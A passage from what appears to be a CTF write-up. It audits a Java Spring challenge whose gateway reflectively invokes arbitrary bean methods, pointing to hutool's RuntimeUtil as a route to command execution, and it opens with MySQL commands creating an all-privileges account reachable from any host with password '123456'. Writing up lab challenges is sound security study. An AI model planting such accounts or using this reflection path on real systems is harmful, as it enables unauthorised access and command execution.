+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE USER <span class="hljs-string">&#x27;remote_user&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span>;<br>GRANT ALL PRIVILEGES ON *.* TO <span class="hljs-string">&#x27;remote_user&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> WITH GRANT OPTION;<br>FLUSH PRIVILEGES;<br></code></pre></td></tr></table></figure>
+<p>这里是检测</p>
+<p>用<code>SELECT user, host FROM mysql.user WHERE user = 'remote_user';</code>检查</p>
+<p><img src="/../../images/Hgame/2025-02-22163358.png" srcset="/img/loading.gif" lazyload alt="2025-02-22163358"></p>
+<h3 id="level-60-signinjava"><a class="markdownIt-Anchor" href="#level-60-signinjava"></a> Level 60 SignInJava</h3>
+<p>动态注册恶意Bean实现RCE</p>
+<p>审计一下代码(由于不会java所以和其他师傅要wp分析的，厌蠢症患者勿骂)</p>
+<p>（Controller），用于处理POST请求，接受客户端传来的JSON数据，解析并根据指定的bean和方法名反射调用相应的服务方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);<br>Map&lt;String, Object&gt; params = (Map) map.get(<span class="hljs-string">&quot;params&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>使用<code>IOUtils.toString(request.getReader())</code>读取HTTP请求体。</p>
+<p>将请求体解析为JSON对象，并转化为<code>Map&lt;String, Object&gt;</code>类型。</p>
+<p>从解析后的<code>map</code>中获取<code>beanName</code>、<code>methodName</code>和<code>params</code>，这些是后续反射调用所需的信息。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, <span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>如果<code>beanName</code>包含&quot;flag&quot;字样（不区分大小写），返回403错误，提示&quot;flagTestService offline&quot;。这可能是为了防止某些特殊请求（如安全相关的标志获取等）。后面的代码是反射调用和异常处理</p>
+<hr>
+<p>实现了一个名为 <code>InvokeUtils</code> 的工具类，主要用于动态反射调用Spring容器中的bean方法。该工具类通过反射获取指定bean的方法，并根据请求的参数动态地构建方法参数进行调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Lazy</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Filter</span> <span class="hljs-variable">autoTypeFilter</span> <span class="hljs-operator">=</span> JSONReader.autoTypeFilter((String[]) ((Set) Arrays.stream(SpringContextHolder.getApplicationContext().getBeanDefinitionNames())<br>    .map(name -&gt; &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">secondDotIndex</span> <span class="hljs-operator">=</span> name.indexOf(<span class="hljs-number">46</span>, name.indexOf(<span class="hljs-number">46</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (secondDotIndex != -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> name.substring(<span class="hljs-number">0</span>, secondDotIndex + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;)<br>    .filter((v0) -&gt; &#123;<br>        <span class="hljs-keyword">return</span> Objects.nonNull(v0);<br>    &#125;)<br>    .collect(Collectors.toSet())).toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]));<br><br></code></pre></td></tr></table></figure>
+<p><strong><code>@Lazy</code></strong>：<code>autoTypeFilter</code>会在第一次使用时进行初始化，避免提前加载，优化启动时间。</p>
+<p><strong><code>autoTypeFilter</code></strong>：通过扫描Spring应用上下文中的所有bean名称，提取每个bean名的前缀（即包路径的一部分），并用于在<code>JSON.parseObject</code>方法中作为过滤器。为了防止反序列化时不安全的类型被引入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">invokeBeanMethod</span><span class="hljs-params">(String beanName, String methodName, Map&lt;String, Object&gt; params)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">beanObject</span> <span class="hljs-operator">=</span> SpringContextHolder.getBean(beanName);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">beanMethod</span> <span class="hljs-operator">=</span> (Method) Arrays.stream(beanObject.getClass().getMethods()).filter(method -&gt; &#123;<br>        <span class="hljs-keyword">return</span> method.getName().equals(methodName);<br>    &#125;).findFirst().orElse(<span class="hljs-literal">null</span>);<br><br></code></pre></td></tr></table></figure>
+<p><strong>获取Bean</strong>：通过<code>SpringContextHolder.getBean(beanName)</code>获取Spring容器中的bean实例。</p>
+<p><strong>获取方法</strong>：通过<code>Arrays.stream(beanObject.getClass().getMethods())</code>获取所有方法并通过<code>method.getName().equals(methodName)</code>来找到匹配的方法。若找不到，返回<code>null</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (beanMethod.getParameterCount() == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> beanMethod.invoke(beanObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>&#125;<br>String[] parameterTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[beanMethod.getParameterCount()];<br>Object[] parameterArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[beanMethod.getParameterCount()];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; beanMethod.getParameters().length; i++) &#123;<br>    Class&lt;?&gt; parameterType = beanMethod.getParameterTypes()[i];<br>    <span class="hljs-type">String</span> <span class="hljs-variable">parameterName</span> <span class="hljs-operator">=</span> beanMethod.getParameters()[i].getName();<br>    parameterTypes[i] = parameterType.getName();<br>    <span class="hljs-keyword">if</span> (!parameterType.isPrimitive() &amp;&amp; !Date.class.equals(parameterType) &amp;&amp; !Long.class.equals(parameterType) &amp;&amp; !Integer.class.equals(parameterType) &amp;&amp; !Boolean.class.equals(parameterType) &amp;&amp; !Double.class.equals(parameterType) &amp;&amp; !Float.class.equals(parameterType) &amp;&amp; !Short.class.equals(parameterType) &amp;&amp; !Byte.class.equals(parameterType) &amp;&amp; !Character.class.equals(parameterType) &amp;&amp; !String.class.equals(parameterType) &amp;&amp; !List.class.equals(parameterType) &amp;&amp; !Set.class.equals(parameterType) &amp;&amp; !Map.class.equals(parameterType)) &#123;<br><br></code></pre></td></tr></table></figure>
+<p>对于有参数的方法，首先解析出方法的参数类型和参数名称，并且构建一个参数数组<code>parameterArgs</code>来存放实际参数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!parameterType.isPrimitive() &amp;&amp; !Date.class.equals(parameterType) &amp;&amp; !Long.class.equals(parameterType) &amp;&amp; !Integer.class.equals(parameterType) &amp;&amp; !Boolean.class.equals(parameterType) &amp;&amp; !Double.class.equals(parameterType) &amp;&amp; !Float.class.equals(parameterType) &amp;&amp; !Short.class.equals(parameterType) &amp;&amp; !Byte.class.equals(parameterType) &amp;&amp; !Character.class.equals(parameterType) &amp;&amp; !String.class.equals(parameterType) &amp;&amp; !List.class.equals(parameterType) &amp;&amp; !Set.class.equals(parameterType) &amp;&amp; !Map.class.equals(parameterType)) &#123;<br>    <span class="hljs-keyword">if</span> (params.containsKey(parameterName)) &#123;<br>        parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params.get(parameterName)), (Class) parameterType, autoTypeFilter, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONReader</span>.Feature[<span class="hljs-number">0</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params), (Class) parameterType, autoTypeFilter, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONReader</span>.Feature[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">catch</span> (JSONException e) &#123;<br>            <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : params.entrySet()) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> entry.getValue();<br>                <span class="hljs-keyword">if</span> ((value <span class="hljs-keyword">instanceof</span> String) &amp;&amp; ((String) value).contains(<span class="hljs-string">&quot;\&quot;&quot;</span>)) &#123;<br>                    params.put(entry.getKey(), JSON.parse((String) value));<br>                &#125;<br>            &#125;<br>            parameterArgs[i] = JSON.parseObject(JSON.toJSONString(params), (Class) parameterType, autoTypeFilter, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONReader</span>.Feature[<span class="hljs-number">0</span>]);<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    parameterArgs[i] = params.getOrDefault(parameterName, <span class="hljs-literal">null</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>如果方法参数类型不是基础类型（如<code>String</code>, <code>Integer</code>, <code>List</code>等），则尝试使用Fastjson的<code>parseObject</code>将<code>params</code>中的相应字段反序列化为目标参数类型。</p>
+<ul>
+<li>使用<code>autoTypeFilter</code>：在反序列化过程中，使用<code>autoTypeFilter</code>来避免类型安全问题。</li>
+<li>如果<code>params</code>中不存在该参数名，则尝试将整个<code>params</code>映射到目标类型。</li>
+<li>如果解析失败（<code>JSONException</code>），则通过递归尝试解析参数内嵌的JSON字符串。</li>
+</ul>
+<p>对于基础类型（包括<code>String</code>、<code>Integer</code>、<code>Boolean</code>等），直接从<code>params</code>中获取对应的值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> beanMethod.invoke(beanObject, parameterArgs);<br></code></pre></td></tr></table></figure>
+<p>这个是触发点，利用下面这个类</p>
+<p><img src="/../../images/Hgame/2025-02-22180854.png" srcset="/img/loading.gif" lazyload alt="2025-02-22180854"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.hutool.core.util;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.exceptions.UtilException;<br><span class="hljs-keyword">import</span> cn.hutool.core.io.IORuntimeException;<br><span class="hljs-keyword">import</span> cn.hutool.core.io.IoUtil;<br><span class="hljs-keyword">import</span> cn.hutool.core.lang.Pid;<br><span class="hljs-keyword">import</span> cn.hutool.core.text.StrBuilder;<br><span class="hljs-keyword">import</span> java.io.Closeable;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Stack;<br><br><span class="hljs-comment">/* loaded from: SigninJava.jar:BOOT-INF/lib/hutool-all-5.8.33.jar:cn/hutool/core/util/RuntimeUtil.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeUtil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">execForStr</span><span class="hljs-params">(String... cmds)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>        <span class="hljs-keyword">return</span> execForStr(CharsetUtil.systemCharset(), cmds);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">execForStr</span><span class="hljs-params">(Charset charset, String... cmds)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>        <span class="hljs-keyword">return</span> getResult(exec(cmds), charset);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">execForLines</span><span class="hljs-params">(String... cmds)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>        <span class="hljs-keyword">return</span> execForLines(CharsetUtil.systemCharset(), cmds);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">execForLines</span><span class="hljs-params">(Charset charset, String... cmds)</span> <span class="hljs-keyword">throws</span> IORuntimeException &#123;<br>        <span class="hljs-keyword">return</span> getResultLines(exec(cmds), charset);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String... cmds)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(handleCmds(cmds)).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>            <span class="hljs-keyword">return</span> process;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IORuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] envp, String... cmds)</span> &#123;<br>        <span class="hljs-keyword">return</span> exec(envp, <span class="hljs-literal">null</span>, cmds);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] envp, File dir, String... cmds)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(handleCmds(cmds), envp, dir);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IORuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getResultLines</span><span class="hljs-params">(Process process)</span> &#123;<br>        <span class="hljs-keyword">return</span> getResultLines(process, CharsetUtil.systemCharset());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getResultLines</span><span class="hljs-params">(Process process, Charset charset)</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = process.getInputStream();<br>            List&lt;String&gt; list = (List) IoUtil.readLines(in, charset, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>());<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">return</span> list;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">throw</span> th;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getResult</span><span class="hljs-params">(Process process)</span> &#123;<br>        <span class="hljs-keyword">return</span> getResult(process, CharsetUtil.systemCharset());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getResult</span><span class="hljs-params">(Process process, Charset charset)</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = process.getInputStream();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> IoUtil.read(in, charset);<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">return</span> read;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">throw</span> th;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getErrorResult</span><span class="hljs-params">(Process process)</span> &#123;<br>        <span class="hljs-keyword">return</span> getErrorResult(process, CharsetUtil.systemCharset());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getErrorResult</span><span class="hljs-params">(Process process, Charset charset)</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = process.getErrorStream();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> IoUtil.read(in, charset);<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">return</span> read;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;<br>            IoUtil.close((Closeable) in);<br>            destroy(process);<br>            <span class="hljs-keyword">throw</span> th;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">(Process process)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != process) &#123;<br>            process.destroy();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addShutdownHook</span><span class="hljs-params">(Runnable hook)</span> &#123;<br>        Runtime.getRuntime().addShutdownHook(hook <span class="hljs-keyword">instanceof</span> Thread ? (Thread) hook : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(hook));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProcessorCount</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">cpu</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();<br>        <span class="hljs-keyword">if</span> (cpu &lt;= <span class="hljs-number">0</span>) &#123;<br>            cpu = <span class="hljs-number">7</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cpu;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getFreeMemory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().freeMemory();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getTotalMemory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().totalMemory();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getMaxMemory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().maxMemory();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getUsableMemory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (getMaxMemory() - getTotalMemory()) + getFreeMemory();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getPid</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> UtilException &#123;<br>        <span class="hljs-keyword">return</span> Pid.INSTANCE.get();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String[] handleCmds(String... cmds) &#123;<br>        <span class="hljs-keyword">if</span> (ArrayUtil.isEmpty((Object[]) cmds)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Command is empty !&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == cmds.length) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> cmds[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (StrUtil.isBlank(cmd)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Command is blank !&quot;</span>);<br>            &#125;<br>            cmds = cmdSplit(cmd);<br>        &#125;<br>        <span class="hljs-keyword">return</span> cmds;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String[] cmdSplit(String cmd) &#123;<br>        List&lt;String&gt; cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> cmd.length();<br>        Stack&lt;Character&gt; stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">inWrap</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">StrBuilder</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> StrUtil.strBuilder();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span 